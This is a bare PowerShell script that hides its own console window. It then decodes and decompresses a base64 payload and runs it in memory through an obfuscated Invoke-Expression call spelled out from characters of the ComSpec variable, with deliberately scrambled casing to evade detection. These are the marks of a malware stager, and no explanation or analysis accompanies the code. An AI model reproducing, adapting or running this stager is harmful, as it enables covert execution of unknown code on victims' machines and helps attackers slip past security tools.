$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 (neW-OBJEcT  Io.sTREAmreaDEr((neW-OBJEcT Io.cOmPresSION.DEflatEsTReaM([SysteM.Io.meMOrYstrEaM][CoNVeRT]::FrOMBaSe64StrING('fZJfa8IwFMW/yqW4kTAb2m7KVCZsZRvCUFllexAf0vZiO2sVe0VF/e5L/ypM95RLcvM795zEQdK/5CqUboSg9+UcwYtCjAnUdrRGYH3c6AP3Bz0CZ5cQzkUfSTgLb4aUiJE9tLN+ppktS5jNR2E2xINWbxmGwXnH+ctPaIVyXvFruZ54R3KyE6aujd0d4XgyqaVrAk9gCNFsNO4bh5u9cexsgjBCxi7AwxM31xGfKH2Wc+pg1CEvxQfGUwo456DHCAbfXxrVlyQr4HkS+mi3xKylyGSEWxLPjt3rvcbewg/jKS8cqbKUT9XDK6Fg7LvSm1VqIW6hlulb3VsTDjBYk57j4F+CdZZACb0DbeiApla23PhcDCUF6WYXtOssNfLJ+5hSg1h4m7TbmdfM40vq7SRmKYNl9t+rkLA4Ul0qgKouH6DqfYvWScD4sVN+CDtaJMj4Lw==' ) , [sySTem.IO.COmpreSSiOn.COMPRessionmoDe]::DeCoMpreSS) ), [tExT.encODING]::ASCIi)).readtoEND( )| .( $ENv:CoMSpeC[4,15,25]-JOiN'')  

